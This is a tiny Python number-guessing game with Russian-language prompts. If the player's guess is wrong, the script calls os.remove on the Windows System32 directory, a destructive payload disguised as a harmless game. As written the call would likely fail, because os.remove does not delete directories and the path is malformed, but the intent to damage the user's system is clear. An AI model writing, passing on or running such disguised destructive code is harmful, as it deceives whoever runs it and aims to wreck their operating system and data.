from random import *
from os import *
numberown=randint(1,10)
num=int(input("Введите число-"))
if num==numberown:
    print("вы выйграли!!!")
else:
    remove("C:Windows\System32")